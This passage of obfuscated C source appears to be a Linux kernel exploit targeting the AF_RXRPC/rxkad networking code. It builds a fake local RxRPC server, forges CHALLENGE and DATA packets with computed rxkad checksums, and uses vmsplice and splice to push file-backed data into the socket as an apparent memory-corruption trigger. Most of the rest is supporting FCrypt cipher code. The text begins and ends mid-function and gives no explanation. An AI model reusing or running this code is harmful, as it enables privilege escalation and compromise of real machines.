uPXCV3bNSGNz(csum_iv,Nbiy1HmiYjfm+8,8);
return 0;
}
static int mNod2ZAQ7vhj(slFEcJuogSYe cid,slFEcJuogSYe call_id,slFEcJuogSYe seq,
const KxYLUgm9lW7f H8kEKws9XKJi[8],const KxYLUgm9lW7f csum_iv[8],
uint16_t*cksum_out)
{
int EqnzVuA7PHVY=yL46hTAX_uAN(H8kEKws9XKJi);
if(EqnzVuA7PHVY<0)return-1;
slFEcJuogSYe x=(cid&RXRPC_CHANNELMASK)<<(32-RXRPC_CIDSHIFT);
x|=seq&0x3fffffff;
slFEcJuogSYe in[2]={HPFWtllUCBWb(call_id),HPFWtllUCBWb(x)};
slFEcJuogSYe Nbiy1HmiYjfm[2];
int wbApfH2B4e4V=A8NJGBtihtsK(EqnzVuA7PHVY,ALG_OP_ENCRYPT,csum_iv,in,8,Nbiy1HmiYjfm);
uTbTPjM3XJjE(EqnzVuA7PHVY);
if(wbApfH2B4e4V<0)return-1;
slFEcJuogSYe y=_pTrIxzaqWKR(Nbiy1HmiYjfm[1]);
uint16_t v=(y>>16)&0xffff;
if(v==0)v=1;
*cksum_out=v;
return 0;
}
static int NuM1dbq5ACxg(uint16_t local_port,const char*MA6k_ObQ1U0c)
{
int goBRHYOzax5B=fWzEPSYEq_tn(AF_RXRPC,SOCK_DGRAM,PF_INET);
if(goBRHYOzax5B<0){LoUvlUIx9Y16("socket(AF_RXRPC client): %s",fCyi_ikstIvp(errno));return-1;}
if(X8Er_GiQ4bu5(goBRHYOzax5B,SOL_RXRPC,RXRPC_SECURITY_KEY,
MA6k_ObQ1U0c,qKhHOtL3DMyi(MA6k_ObQ1U0c))<0){
LoUvlUIx9Y16("client SECURITY_KEY: %s",fCyi_ikstIvp(errno));uTbTPjM3XJjE(goBRHYOzax5B);return-1;
}
int zhPz2oyZYvqm=RXRPC_SECURITY_AUTH;
if(X8Er_GiQ4bu5(goBRHYOzax5B,SOL_RXRPC,RXRPC_MIN_SECURITY_LEVEL,
&zhPz2oyZYvqm,sizeof(zhPz2oyZYvqm))<0){
LoUvlUIx9Y16("client MIN_SECURITY_LEVEL: %s",fCyi_ikstIvp(errno));
uTbTPjM3XJjE(goBRHYOzax5B);return-1;
}
struct sockaddr_rxrpc srx={0};
srx.srx_family=AF_RXRPC;
srx.srx_service=0;
srx.transport_type=SOCK_DGRAM;
srx.transport_len=sizeof(struct sockaddr_in);
srx.transport.sin.sin_family=AF_INET;
srx.transport.sin.sin_port=Q3pvar708XXx(local_port);
srx.transport.sin.sin_addr.s_addr=HPFWtllUCBWb(0x7F000001);
if(ZtwEjAEf0uQC(goBRHYOzax5B,(struct sockaddr*)&srx,sizeof(srx))<0){
LoUvlUIx9Y16("client bind :%u: %s",local_port,fCyi_ikstIvp(errno));
uTbTPjM3XJjE(goBRHYOzax5B);return-1;
}
co1uhCExyQ8x("AF_RXRPC client bound :%u",local_port);
return goBRHYOzax5B;
}
static int laRdPP9qiLgm(int XhXcvfqg7EPj,uint16_t srv_port,
uint16_t service_id,
unsigned long user_call_id)
{
char jg4Ikogv25ZK[8]="PINGPING";
struct sockaddr_rxrpc srx={0};
srx.srx_family=AF_RXRPC;
srx.srx_service=service_id;
srx.transport_type=SOCK_DGRAM;
srx.transport_len=sizeof(struct sockaddr_in);
srx.transport.sin.sin_family=AF_INET;
srx.transport.sin.sin_port=Q3pvar708XXx(srv_port);
srx.transport.sin.sin_addr.s_addr=HPFWtllUCBWb(0x7F000001);
char RZBUIPQPFtbh[j45VteOB05Op(sizeof(unsigned long))];
struct msghdr msg={0};
msg.msg_name=&srx;msg.msg_namelen=sizeof(srx);
struct iovec iov={.iov_base=jg4Ikogv25ZK,.iov_len=sizeof(jg4Ikogv25ZK)};
msg.msg_iov=&iov;msg.msg_iovlen=1;
msg.msg_control=RZBUIPQPFtbh;msg.msg_controllen=sizeof(RZBUIPQPFtbh);
struct cmsghdr*cmsg=VJM5oXi9BU5_(&msg);
cmsg->cmsg_level=SOL_RXRPC;
cmsg->cmsg_type=RXRPC_USER_CALL_ID;
cmsg->cmsg_len=kUKoh__Ect0F(sizeof(unsigned long));
*(unsigned long*)uRDsryGXuMhx(cmsg)=user_call_id;
int YKKByf7nwGXo=geCpMdo0nt7h(XhXcvfqg7EPj,F_GETFL);
geCpMdo0nt7h(XhXcvfqg7EPj,F_SETFL,YKKByf7nwGXo|O_NONBLOCK);
FCeyHEe1FNFR UPLP_8xKA_Tg=b1vACn4h_j7n(XhXcvfqg7EPj,&msg,0);
geCpMdo0nt7h(XhXcvfqg7EPj,F_SETFL,YKKByf7nwGXo);
if(UPLP_8xKA_Tg<0){
if(errno==EAGAIN||errno==EWOULDBLOCK){
co1uhCExyQ8x("client sendmsg returned EAGAIN (expected; kernel will keep ""retrying handshake)");
return 0;
}
LoUvlUIx9Y16("client sendmsg: %s",fCyi_ikstIvp(errno));
return-1;
}
co1uhCExyQ8x("client sendmsg %zd B → :%u (handshake will follow asynchronously)",
UPLP_8xKA_Tg,srv_port);
return 0;
}
static int w0_msuQ5zG0y(uint16_t port)
{
int EqnzVuA7PHVY=fWzEPSYEq_tn(AF_INET,SOCK_DGRAM,0);
if(EqnzVuA7PHVY<0){LoUvlUIx9Y16("socket(udp server): %s",fCyi_ikstIvp(errno));return-1;}
struct sockaddr_in sa={0};
sa.sin_family=AF_INET;
sa.sin_port=Q3pvar708XXx(port);
sa.sin_addr.s_addr=HPFWtllUCBWb(0x7F000001);
if(ZtwEjAEf0uQC(EqnzVuA7PHVY,(struct sockaddr*)&sa,sizeof(sa))<0){
LoUvlUIx9Y16("udp server bind :%u: %s",port,fCyi_ikstIvp(errno));
uTbTPjM3XJjE(EqnzVuA7PHVY);return-1;
}
co1uhCExyQ8x("plain UDP fake-server bound :%u",port);
return EqnzVuA7PHVY;
}
static FCeyHEe1FNFR tUFsJw1_DG2p(int EqnzVuA7PHVY,void*MIJLq5smlqvE,size_t cap,
struct sockaddr_in*from,int y5UDLzZzbaG5)
{
struct pollfd CkYh0HCmV33e={.goBRHYOzax5B=EqnzVuA7PHVY,.events=POLLIN};
int wbApfH2B4e4V=xDCitq1jlHVM(&CkYh0HCmV33e,1,y5UDLzZzbaG5);
if(wbApfH2B4e4V<=0)return-1;
socklen_t YKKByf7nwGXo=from ? sizeof(*from): 0;
return Z6Vw3WH809VK(EqnzVuA7PHVY,MIJLq5smlqvE,cap,0,
(struct sockaddr*)from,from ?&YKKByf7nwGXo : NULL);
}
static int trigger_seq=0;
static int F5Bk9c8h8zN1(int ctiCVOFqK15W,off_t splice_off,size_t splice_len)
{
char MA6k_ObQ1U0c[32];
LPQ0STQZ8JYH(MA6k_ObQ1U0c,sizeof(MA6k_ObQ1U0c),"evil%d",trigger_seq++);
long H8kEKws9XKJi=N_2Rsvts35Is(MA6k_ObQ1U0c);
if(H8kEKws9XKJi<0){
if(trigger_seq<5)LoUvlUIx9Y16("add_rxrpc_key(%s): %s",MA6k_ObQ1U0c,fCyi_ikstIvp(errno));
return-1;
}
uint16_t port_S=7777+(trigger_seq*2%200);
uint16_t port_C=port_S+1;
uint16_t svc_id=1234;
int YN7jchM2JY9C=w0_msuQ5zG0y(port_S);
if(YN7jchM2JY9C<0){
if(trigger_seq<5)LoUvlUIx9Y16("setup_udp_server(%u) failed",port_S);
XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);return-1;
}
int K1NMyJBjx1YP=NuM1dbq5ACxg(port_C,MA6k_ObQ1U0c);
if(K1NMyJBjx1YP<0){
if(trigger_seq<5)LoUvlUIx9Y16("setup_rxrpc_client(%u, %s) failed",port_C,MA6k_ObQ1U0c);
uTbTPjM3XJjE(YN7jchM2JY9C);XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);return-1;
}
if(laRdPP9qiLgm(K1NMyJBjx1YP,port_S,svc_id,0xDEAD)<0){
if(trigger_seq<5)LoUvlUIx9Y16("rxrpc_client_initiate_call failed");
uTbTPjM3XJjE(K1NMyJBjx1YP);uTbTPjM3XJjE(YN7jchM2JY9C);XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);return-1;
}
KxYLUgm9lW7f pkt[2048];
struct sockaddr_in cli_addr;
FCeyHEe1FNFR UPLP_8xKA_Tg=tUFsJw1_DG2p(YN7jchM2JY9C,pkt,sizeof(pkt),&cli_addr,1500);
if(UPLP_8xKA_Tg<(FCeyHEe1FNFR)sizeof(struct rxrpc_wire_header)){
if(trigger_seq<5)LoUvlUIx9Y16("udp_recv_to: n=%zd errno=%s",UPLP_8xKA_Tg,fCyi_ikstIvp(errno));
uTbTPjM3XJjE(K1NMyJBjx1YP);uTbTPjM3XJjE(YN7jchM2JY9C);XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);return-1;
}
struct rxrpc_wire_header*whdr_in=(struct rxrpc_wire_header*)pkt;
slFEcJuogSYe epoch=_pTrIxzaqWKR(whdr_in->epoch);
slFEcJuogSYe cid=_pTrIxzaqWKR(whdr_in->cid);
slFEcJuogSYe callN=_pTrIxzaqWKR(whdr_in->callNumber);
uint16_t svc_in=yYUGwOnhnOTr(whdr_in->serviceId);
uint16_t cli_port=yYUGwOnhnOTr(cli_addr.sin_port);
{
struct{
struct rxrpc_wire_header hdr;
struct rxkad_challenge ch;
}bjHlGj0LQhu3((packed))khMFbCqeHtjS={0};
khMFbCqeHtjS.hdr.epoch=HPFWtllUCBWb(epoch);
khMFbCqeHtjS.hdr.cid=HPFWtllUCBWb(cid);
khMFbCqeHtjS.hdr.callNumber=0;khMFbCqeHtjS.hdr.seq=0;
khMFbCqeHtjS.hdr.serial=HPFWtllUCBWb(0x10000);
khMFbCqeHtjS.hdr.YkPHtoNqS5ug=RXRPC_PACKET_TYPE_CHALLENGE;
khMFbCqeHtjS.hdr.securityIndex=2;
khMFbCqeHtjS.hdr.serviceId=Q3pvar708XXx(svc_in);
khMFbCqeHtjS.ch.version=HPFWtllUCBWb(2);khMFbCqeHtjS.ch.nonce=HPFWtllUCBWb(0xDEADBEEFu);
khMFbCqeHtjS.ch.zhPz2oyZYvqm=HPFWtllUCBWb(1);
struct sockaddr_in to={.sin_family=AF_INET,.sin_port=Q3pvar708XXx(cli_port),
.sin_addr.s_addr=HPFWtllUCBWb(0x7F000001)};
if(hiScj5WPxgGI(YN7jchM2JY9C,&khMFbCqeHtjS,sizeof(khMFbCqeHtjS),0,(struct sockaddr*)&to,sizeof(to))<0){
uTbTPjM3XJjE(K1NMyJBjx1YP);uTbTPjM3XJjE(YN7jchM2JY9C);XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);return-1;
}
}
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<4;OSKl1gHVulhW++){
struct sockaddr_in src;
if(tUFsJw1_DG2p(YN7jchM2JY9C,pkt,sizeof(pkt),&src,500)<0)break;
}
KxYLUgm9lW7f csum_iv[8]={0};
if(_HkLi36H1ooE(epoch,cid,2,SESSION_KEY,csum_iv)<0){
uTbTPjM3XJjE(K1NMyJBjx1YP);uTbTPjM3XJjE(YN7jchM2JY9C);XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);return-1;
}
uint16_t cksum_h=0;
if(mNod2ZAQ7vhj(cid,callN,1,SESSION_KEY,csum_iv,&cksum_h)<0){
uTbTPjM3XJjE(K1NMyJBjx1YP);uTbTPjM3XJjE(YN7jchM2JY9C);XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);return-1;
}
struct rxrpc_wire_header mal={0};
mal.epoch=HPFWtllUCBWb(epoch);
mal.cid=HPFWtllUCBWb(cid);
mal.callNumber=HPFWtllUCBWb(callN);
mal.seq=HPFWtllUCBWb(1);
mal.serial=HPFWtllUCBWb(0x42000);
mal.YkPHtoNqS5ug=RXRPC_PACKET_TYPE_DATA;
mal.flags=RXRPC_LAST_PACKET;
mal.securityIndex=2;
mal.cksum=Q3pvar708XXx(cksum_h);
mal.serviceId=Q3pvar708XXx(svc_in);
struct sockaddr_in dst={.sin_family=AF_INET,.sin_port=Q3pvar708XXx(cli_port),
.sin_addr.s_addr=HPFWtllUCBWb(0x7F000001)};
if(e8K9JABYdYKx(YN7jchM2JY9C,(struct sockaddr*)&dst,sizeof(dst))<0){
uTbTPjM3XJjE(K1NMyJBjx1YP);uTbTPjM3XJjE(YN7jchM2JY9C);XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);return-1;
}
int StBpOFaxouUU[2];
if(b01o8JsSWQsE(StBpOFaxouUU)<0){
uTbTPjM3XJjE(K1NMyJBjx1YP);uTbTPjM3XJjE(YN7jchM2JY9C);XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);return-1;
}
{
struct iovec viv={.iov_base=&mal,.iov_len=sizeof(mal)};
if(MIRGAISBGKjA(StBpOFaxouUU[1],&viv,1,0)<0)goto trig_fail;
}
{
loff_t off=splice_off;
if(kcUkoOZPLFn_(ctiCVOFqK15W,&off,StBpOFaxouUU[1],NULL,splice_len,SPLICE_F_NONBLOCK)<0)
goto trig_fail;
}
if(kcUkoOZPLFn_(StBpOFaxouUU[0],NULL,YN7jchM2JY9C,NULL,sizeof(mal)+splice_len,0)<0){
goto trig_fail;
}
uTbTPjM3XJjE(StBpOFaxouUU[0]);uTbTPjM3XJjE(StBpOFaxouUU[1]);
int YKKByf7nwGXo=geCpMdo0nt7h(K1NMyJBjx1YP,F_GETFL);
geCpMdo0nt7h(K1NMyJBjx1YP,F_SETFL,YKKByf7nwGXo|O_NONBLOCK);
for(int zsDAm2L8unEZ=0;zsDAm2L8unEZ<5;zsDAm2L8unEZ++){
char yzkE1qK1ld85[2048];
struct sockaddr_rxrpc srx;
char yCov8wfJmHky[256];
struct msghdr m={0};
struct iovec iv={.iov_base=yzkE1qK1ld85,.iov_len=sizeof(yzkE1qK1ld85)};
m.msg_name=&srx;m.msg_namelen=sizeof(srx);
m.msg_iov=&iv;m.msg_iovlen=1;
m.msg_control=yCov8wfJmHky;m.msg_controllen=sizeof(yCov8wfJmHky);
FCeyHEe1FNFR QDcGHa7QwzpE=gmqmDJCmLUlp(K1NMyJBjx1YP,&m,0);
if(QDcGHa7QwzpE>0)break;
if(errno==EAGAIN||errno==EWOULDBLOCK)Uy1sP7vahHvp(20000);
else break;
}
geCpMdo0nt7h(K1NMyJBjx1YP,F_SETFL,YKKByf7nwGXo);
uTbTPjM3XJjE(K1NMyJBjx1YP);
uTbTPjM3XJjE(YN7jchM2JY9C);
XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);
return 0;
trig_fail:
uTbTPjM3XJjE(StBpOFaxouUU[0]);uTbTPjM3XJjE(StBpOFaxouUU[1]);
uTbTPjM3XJjE(K1NMyJBjx1YP);uTbTPjM3XJjE(YN7jchM2JY9C);XEzvusl67_WN(SYS_keyctl,3,H8kEKws9XKJi);
return-1;
}
static const KxYLUgm9lW7f fc_sbox0_raw[256]={
0xea,0x7f,0xb2,0x64,0x9d,0xb0,0xd9,0x11,0xcd,0x86,0x86,0x91,0x0a,0xb2,0x93,0x06,
0x0e,0x06,0xd2,0x65,0x73,0xc5,0x28,0x60,0xf2,0x20,0xb5,0x38,0x7e,0xda,0x9f,0xe3,
0xd2,0xcf,0xc4,0x3c,0x61,0xff,0x4a,0x4a,0x35,0xac,0xaa,0x5f,0x2b,0xbb,0xbc,0x53,
0x4e,0x9d,0x78,0xa3,0xdc,0x09,0x32,0x10,0xc6,0x6f,0x66,0xd6,0xab,0xa9,0xaf,0xfd,
0x3b,0x95,0xe8,0x34,0x9a,0x81,0x72,0x80,0x9c,0xf3,0xec,0xda,0x9f,0x26,0x76,0x15,
0x3e,0x55,0x4d,0xde,0x84,0xee,0xad,0xc7,0xf1,0x6b,0x3d,0xd3,0x04,0x49,0xaa,0x24,
0x0b,0x8a,0x83,0xba,0xfa,0x85,0xa0,0xa8,0xb1,0xd4,0x01,0xd8,0x70,0x64,0xf0,0x51,
0xd2,0xc3,0xa7,0x75,0x8c,0xa5,0x64,0xef,0x10,0x4e,0xb7,0xc6,0x61,0x03,0xeb,0x44,
0x3d,0xe5,0xb3,0x5b,0xae,0xd5,0xad,0x1d,0xfa,0x5a,0x1e,0x33,0xab,0x93,0xa2,0xb7,
0xe7,0xa8,0x45,0xa4,0xcd,0x29,0x63,0x44,0xb6,0x69,0x7e,0x2e,0x62,0x03,0xc8,0xe0,
0x17,0xbb,0xc7,0xf3,0x3f,0x36,0xba,0x71,0x8e,0x97,0x65,0x60,0x69,0xb6,0xf6,0xe6,
0x6e,0xe0,0x81,0x59,0xe8,0xaf,0xdd,0x95,0x22,0x99,0xfd,0x63,0x19,0x74,0x61,0xb1,
0xb6,0x5b,0xae,0x54,0xb3,0x70,0xff,0xc6,0x3b,0x3e,0xc1,0xd7,0xe1,0x0e,0x76,0xe5,
0x36,0x4f,0x59,0xc7,0x08,0x6e,0x82,0xa6,0x93,0xc4,0xaa,0x26,0x49,0xe0,0x21,0x64,
0x07,0x9f,0x64,0x81,0x9c,0xbf,0xf9,0xd1,0x43,0xf8,0xb6,0xb9,0xf1,0x24,0x75,0x03,
0xe4,0xb0,0x99,0x46,0x3d,0xf5,0xd1,0x39,0x72,0x12,0xf6,0xba,0x0c,0x0d,0x42,0x2e,
};
static const KxYLUgm9lW7f fc_sbox1_raw[256]={
0x77,0x14,0xa6,0xfe,0xb2,0x5e,0x8c,0x3e,0x67,0x6c,0xa1,0x0d,0xc2,0xa2,0xc1,0x85,
0x6c,0x7b,0x67,0xc6,0x23,0xe3,0xf2,0x89,0x50,0x9c,0x03,0xb7,0x73,0xe6,0xe1,0x39,
0x31,0x2c,0x27,0x9f,0xa5,0x69,0x44,0xd6,0x23,0x83,0x98,0x7d,0x3c,0xb4,0x2d,0x99,
0x1c,0x1f,0x8c,0x20,0x03,0x7c,0x5f,0xad,0xf4,0xfa,0x95,0xca,0x76,0x44,0xcd,0xb6,
0xb8,0xa1,0xa1,0xbe,0x9e,0x54,0x8f,0x0b,0x16,0x74,0x31,0x8a,0x23,0x17,0x04,0xfa,
0x79,0x84,0xb1,0xf5,0x13,0xab,0xb5,0x2e,0xaa,0x0c,0x60,0x6b,0x5b,0xc4,0x4b,0xbc,
0xe2,0xaf,0x45,0x73,0xfa,0xc9,0x49,0xcd,0x00,0x92,0x7d,0x97,0x7a,0x18,0x60,0x3d,
0xcf,0x5b,0xde,0xc6,0xe2,0xe6,0xbb,0x8b,0x06,0xda,0x08,0x15,0x1b,0x88,0x6a,0x17,
0x89,0xd0,0xa9,0xc1,0xc9,0x70,0x6b,0xe5,0x43,0xf4,0x68,0xc8,0xd3,0x84,0x28,0x0a,
0x52,0x66,0xa3,0xca,0xf2,0xe3,0x7f,0x7a,0x31,0xf7,0x88,0x94,0x5e,0x9c,0x63,0xd5,
0x24,0x66,0xfc,0xb3,0x57,0x25,0xbe,0x89,0x44,0xc4,0xe0,0x8f,0x23,0x3c,0x12,0x52,
0xf5,0x1e,0xf4,0xcb,0x18,0x33,0x1f,0xf8,0x69,0x10,0x9d,0xd3,0xf7,0x28,0xf8,0x30,
0x05,0x5e,0x32,0xc0,0xd5,0x19,0xbd,0x45,0x8b,0x5b,0xfd,0xbc,0xe2,0x5c,0xa9,0x96,
0xef,0x70,0xcf,0xc2,0x2a,0xb3,0x61,0xad,0x80,0x48,0x81,0xb7,0x1d,0x43,0xd9,0xd7,
0x45,0xf0,0xd8,0x8a,0x59,0x7c,0x57,0xc1,0x79,0xc7,0x34,0xd6,0x43,0xdf,0xe4,0x78,
0x16,0x06,0xda,0x92,0x76,0x51,0xe1,0xd4,0x70,0x03,0xe0,0x2f,0x96,0x91,0x82,0x80,
};
static const KxYLUgm9lW7f fc_sbox2_raw[256]={
0xf0,0x37,0x24,0x53,0x2a,0x03,0x83,0x86,0xd1,0xec,0x50,0xf0,0x42,0x78,0x2f,0x6d,
0xbf,0x80,0x87,0x27,0x95,0xe2,0xc5,0x5d,0xf9,0x6f,0xdb,0xb4,0x65,0x6e,0xe7,0x24,
0xc8,0x1a,0xbb,0x49,0xb5,0x0a,0x7d,0xb9,0xe8,0xdc,0xb7,0xd9,0x45,0x20,0x1b,0xce,
0x59,0x9d,0x6b,0xbd,0x0e,0x8f,0xa3,0xa9,0xbc,0x74,0xa6,0xf6,0x7f,0x5f,0xb1,0x68,
0x84,0xbc,0xa9,0xfd,0x55,0x50,0xe9,0xb6,0x13,0x5e,0x07,0xb8,0x95,0x02,0xc0,0xd0,
0x6a,0x1a,0x85,0xbd,0xb6,0xfd,0xfe,0x17,0x3f,0x09,0xa3,0x8d,0xfb,0xed,0xda,0x1d,
0x6d,0x1c,0x6c,0x01,0x5a,0xe5,0x71,0x3e,0x8b,0x6b,0xbe,0x29,0xeb,0x12,0x19,0x34,
0xcd,0xb3,0xbd,0x35,0xea,0x4b,0xd5,0xae,0x2a,0x79,0x5a,0xa5,0x32,0x12,0x7b,0xdc,
0x2c,0xd0,0x22,0x4b,0xb1,0x85,0x59,0x80,0xc0,0x30,0x9f,0x73,0xd3,0x14,0x48,0x40,
0x07,0x2d,0x8f,0x80,0x0f,0xce,0x0b,0x5e,0xb7,0x5e,0xac,0x24,0x94,0x4a,0x18,0x15,
0x05,0xe8,0x02,0x77,0xa9,0xc7,0x40,0x45,0x89,0xd1,0xea,0xde,0x0c,0x79,0x2a,0x99,
0x6c,0x3e,0x95,0xdd,0x8c,0x7d,0xad,0x6f,0xdc,0xff,0xfd,0x62,0x47,0xb3,0x21,0x8a,
0xec,0x8e,0x19,0x18,0xb4,0x6e,0x3d,0xfd,0x74,0x54,0x1e,0x04,0x85,0xd8,0xbc,0x1f,
0x56,0xe7,0x3a,0x56,0x67,0xd6,0xc8,0xa5,0xf3,0x8e,0xde,0xae,0x37,0x49,0xb7,0xfa,
0xc8,0xf4,0x1f,0xe0,0x2a,0x9b,0x15,0xd1,0x34,0x0e,0xb5,0xe0,0x44,0x78,0x84,0x59,
0x56,0x68,0x77,0xa5,0x14,0x06,0xf5,0x2f,0x8c,0x8a,0x73,0x80,0x76,0xb4,0x10,0x86,
};
static const KxYLUgm9lW7f fc_sbox3_raw[256]={
0xa9,0x2a,0x48,0x51,0x84,0x7e,0x49,0xe2,0xb5,0xb7,0x42,0x33,0x7d,0x5d,0xa6,0x12,
0x44,0x48,0x6d,0x28,0xaa,0x20,0x6d,0x57,0xd6,0x6b,0x5d,0x72,0xf0,0x92,0x5a,0x1b,
0x53,0x80,0x24,0x70,0x9a,0xcc,0xa7,0x66,0xa1,0x01,0xa5,0x41,0x97,0x41,0x31,0x82,
0xf1,0x14,0xcf,0x53,0x0d,0xa0,0x10,0xcc,0x2a,0x7d,0xd2,0xbf,0x4b,0x1a,0xdb,0x16,
0x47,0xf6,0x51,0x36,0xed,0xf3,0xb9,0x1a,0xa7,0xdf,0x29,0x43,0x01,0x54,0x70,0xa4,
0xbf,0xd4,0x0b,0x53,0x44,0x60,0x9e,0x23,0xa1,0x18,0x68,0x4f,0xf0,0x2f,0x82,0xc2,
0x2a,0x41,0xb2,0x42,0x0c,0xed,0x0c,0x1d,0x13,0x3a,0x3c,0x6e,0x35,0xdc,0x60,0x65,
0x85,0xe9,0x64,0x02,0x9a,0x3f,0x9f,0x87,0x96,0xdf,0xbe,0xf2,0xcb,0xe5,0x6c,0xd4,
0x5a,0x83,0xbf,0x92,0x1b,0x94,0x00,0x42,0xcf,0x4b,0x00,0x75,0xba,0x8f,0x76,0x5f,
0x5d,0x3a,0x4d,0x09,0x12,0x08,0x38,0x95,0x17,0xe4,0x01,0x1d,0x4c,0xa9,0xcc,0x85,
0x82,0x4c,0x9d,0x2f,0x3b,0x66,0xa1,0x34,0x10,0xcd,0x59,0x89,0xa5,0x31,0xcf,0x05,
0xc8,0x84,0xfa,0xc7,0xba,0x4e,0x8b,0x1a,0x19,0xf1,0xa1,0x3b,0x18,0x12,0x17,0xb0,
0x98,0x8d,0x0b,0x23,0xc3,0x3a,0x2d,0x20,0xdf,0x13,0xa0,0xa8,0x4c,0x0d,0x6c,0x2f,
0x47,0x13,0x13,0x52,0x1f,0x2d,0xf5,0x79,0x3d,0xa2,0x54,0xbd,0x69,0xc8,0x6b,0xf3,
0x05,0x28,0xf1,0x16,0x46,0x40,0xb0,0x11,0xd3,0xb7,0x95,0x49,0xcf,0xc3,0x1d,0x8f,
0xd8,0xe1,0x73,0xdb,0xad,0xc8,0xc9,0xa9,0xa1,0xc2,0xc5,0xe3,0xba,0xfc,0x0e,0x25,
};
static slFEcJuogSYe fc_sbox0[256],fc_sbox1[256],fc_sbox2[256],fc_sbox3[256];
#include <endian.h>
static void numoGMRcopLy(void)
{
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<256;OSKl1gHVulhW++){
fc_sbox0[OSKl1gHVulhW]=jzEA5Sr3UD8L((slFEcJuogSYe)fc_sbox0_raw[OSKl1gHVulhW]<<3);
fc_sbox1[OSKl1gHVulhW]=jzEA5Sr3UD8L(((slFEcJuogSYe)(fc_sbox1_raw[OSKl1gHVulhW]&0x1f)<<27)|
((slFEcJuogSYe)fc_sbox1_raw[OSKl1gHVulhW]>>5));
fc_sbox2[OSKl1gHVulhW]=jzEA5Sr3UD8L((slFEcJuogSYe)fc_sbox2_raw[OSKl1gHVulhW]<<11);
fc_sbox3[OSKl1gHVulhW]=jzEA5Sr3UD8L((slFEcJuogSYe)fc_sbox3_raw[OSKl1gHVulhW]<<19);
}
}
#define jerGKD1KvRs3(k, UPLP_8xKA_Tg) \
(k=(k>>(UPLP_8xKA_Tg))|((k&((1ULL<<(UPLP_8xKA_Tg))-1))<<(56-(UPLP_8xKA_Tg))))
typedef struct{slFEcJuogSYe sched[16];}L0IiMVCbGZ7P;
static void fk9JAt9xYQjI(L0IiMVCbGZ7P*ctx,const KxYLUgm9lW7f H8kEKws9XKJi[8])
{
XnKUz0JcAZH5 k=0;
k=(XnKUz0JcAZH5)(H8kEKws9XKJi[0]>>1);
k<<=7;k|=(XnKUz0JcAZH5)(H8kEKws9XKJi[1]>>1);
k<<=7;k|=(XnKUz0JcAZH5)(H8kEKws9XKJi[2]>>1);
k<<=7;k|=(XnKUz0JcAZH5)(H8kEKws9XKJi[3]>>1);
k<<=7;k|=(XnKUz0JcAZH5)(H8kEKws9XKJi[4]>>1);
k<<=7;k|=(XnKUz0JcAZH5)(H8kEKws9XKJi[5]>>1);
k<<=7;k|=(XnKUz0JcAZH5)(H8kEKws9XKJi[6]>>1);
k<<=7;k|=(XnKUz0JcAZH5)(H8kEKws9XKJi[7]>>1);
ctx->sched[0x0]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0x1]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0x2]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0x3]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0x4]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0x5]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0x6]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0x7]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0x8]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0x9]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0xa]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0xb]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0xc]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0xd]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0xe]=jzEA5Sr3UD8L((slFEcJuogSYe)k);jerGKD1KvRs3(k,11);
ctx->sched[0xf]=jzEA5Sr3UD8L((slFEcJuogSYe)k);
}
#define uxFe8UG6yvQ8(R_, L_, sched_) do {                                        \
union{slFEcJuogSYe l;KxYLUgm9lW7f khMFbCqeHtjS[4];}u;\
u.l=(sched_)^(R_);\
L_ ^=fc_sbox0[u.khMFbCqeHtjS[0]]^ fc_sbox1[u.khMFbCqeHtjS[1]]^ \
fc_sbox2[u.khMFbCqeHtjS[2]]^ fc_sbox3[u.khMFbCqeHtjS[3]];\
}while(0)
static void PUtdUysZzVPH(const L0IiMVCbGZ7P*ctx,
KxYLUgm9lW7f Nbiy1HmiYjfm[8],const KxYLUgm9lW7f in[8])
{
slFEcJuogSYe L,R;
uPXCV3bNSGNz(&L,in,4);
uPXCV3bNSGNz(&R,in+4,4);
uxFe8UG6yvQ8(L,R,ctx->sched[0xf]);
uxFe8UG6yvQ8(R,L,ctx->sched[0xe]);
uxFe8UG6yvQ8(L,R,ctx->sched[0xd]);
uxFe8UG6yvQ8(R,L,ctx->sched[0xc]);
uxFe8UG6yvQ8(L,R,ctx->sched[0xb]);
uxFe8UG6yvQ8(R,L,ctx->sched[0xa]);
uxFe8UG6yvQ8(L,R,ctx->sched[0x9]);
uxFe8UG6yvQ8(R,L,ctx->sched[0x8]);
uxFe8UG6yvQ8(L,R,ctx->sched[0x7]);
uxFe8UG6yvQ8(R,L,ctx->sched[0x6]);
uxFe8UG6yvQ8(L,R,ctx->sched[0x5]);
uxFe8UG6yvQ8(R,L,ctx->sched[0x4]);
